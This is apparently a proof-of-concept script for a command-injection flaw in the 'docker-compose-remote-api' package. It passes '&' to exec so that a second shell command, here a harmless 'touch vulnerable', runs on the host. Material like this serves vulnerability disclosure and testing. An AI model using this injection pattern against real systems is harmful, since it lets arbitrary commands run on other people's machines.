const root = require("docker-compose-remote-api");
try {
  root({ cwd: __dirname }).exec("&", "touch vulnerable",
    () => {},
    () => {},
    () => {}
  );
} catch (err) {}
